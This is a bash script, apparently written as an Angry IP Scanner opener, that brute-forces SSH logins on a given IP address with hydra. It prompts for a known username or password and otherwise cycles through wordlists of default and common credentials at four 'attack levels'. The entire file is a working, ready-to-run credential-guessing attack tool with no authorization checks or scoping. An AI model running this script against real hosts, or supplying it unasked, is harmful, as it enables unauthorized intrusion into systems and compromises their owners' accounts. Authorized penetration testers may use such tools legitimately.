#!/bin/bash

# Angry IP information -----------------------------------------------------------
# | Angry Name                 | Execution String              | Run in Terminal | Directory |
# | -------------------------- | ----------------------------- | --------------- | --------- |
# | 22_SSH - HYDRA | THIS_FILE ${fetcher.ip} | TRUE            |           |

# Script information -----------------------------------------------------------
# | Script Name       : HYDRA_SSH.sh
# | Description       : Script for brute force hydra
# | Directory         : ~/CYBER_TOOLS/SCRIPTS/
# | Author            : Jordon Archer
# | Date              : August 24, 2023
# ------------------------------------------------------------------------------      :

address=$1

# Define color variables
GREEN=$(tput setaf 2)
RED=$(tput setaf 1)
YELLOW=$(tput setaf 3)
NC=$(tput sgr0) # No Color

# Define username and password lists
user_name_list_1="$HOME/CYBER_TOOLS/Wordlists/wordlists-main/usernames/http_default_users.txt"
user_name_list_2="$HOME/CYBER_TOOLS/Wordlists/wordlists-main/usernames/cirt_default_usernames.txt"
user_name_list_3="$HOME/CYBER_TOOLS/Wordlists/wordlists-main/usernames/multiple_sources_users.txt"
user_name_list_4="$HOME/CYBER_TOOLS/Wordlists/wordlists-main/usernames/xato_net_usernames.txt"

password_list_1="$HOME/CYBER_TOOLS/Wordlists/wordlists-main/passwords/http_default_passwords.txt"
password_list_2="$HOME/CYBER_TOOLS/Wordlists/wordlists-main/passwords/unix_passwords.txt"
password_list_3="$HOME/CYBER_TOOLS/Wordlists/wordlists-main/passwords/most_used_passwords.txt"
password_list_4="$HOME/CYBER_TOOLS/Wordlists/wordlists-main/passwords/xato_net_passwords.txt"

# Ask the user if they know the username
read -e -p "${YELLOW}Do you know the username? (y/n): ${NC}" -i "n" know_username

if [[ $know_username == "y" ]]; then
    read -e -p "${YELLOW}Enter the username: ${NC}" -i "" username
else
    username=""
fi

# Ask the user if they know the password
read -e -p "${YELLOW}Do you know the password? (y/n): ${NC}" -i "n" know_password

if [[ $know_password == "y" ]]; then
    read -e -p "${YELLOW}Enter the password: ${NC}" -i "" password
else
    password=""
fi

# Ask the user for the level of attack
read -e -p "${YELLOW}Choose the level of attack (1/2/3/4): ${NC}" -i "1" attack_level

case $attack_level in
    1)
        user_name_list=$user_name_list_1
        password_list=$password_list_1
        ;;
    2)
        user_name_list=$user_name_list_2
        password_list=$password_list_2
        ;;
    3)
        user_name_list=$user_name_list_3
        password_list=$password_list_3
        ;;
    4)
        user_name_list=$user_name_list_4
        password_list=$password_list_4
        ;;
    *)
        echo "Invalid attack level. Defaulting to level 1."
        user_name_list=$user_name_list_1
        password_list=$password_list_1
        ;;
esac

# Hydra attack based on user input
if [[ $attack_level -eq 1 ]]; then
    if [[ -n $username ]] && [[ -n $password ]]; then
        hydra -l $username -p $password $address ssh -V -I -t 4
    elif [[ -n $username ]]; then
        hydra -l $username -P $password_list $address ssh -V -I -t 4
    else
        hydra -L $user_name_list -P $password_list $address ssh -V -I -t 4
    fi
else
    if [[ -n $username ]] && [[ -n $password ]]; then
        hydra -l $username -p $password $address ssh -v -I -f -t 4
    elif [[ -n $username ]]; then
        hydra -l $username -P $password_list $address ssh -v -I -f -t 4
    else
        hydra -L $user_name_list -P $password_list $address ssh -v -I -f -t 4
    fi
fi

# ...

echo -e "${RED}Hydra attack finished.${NC}"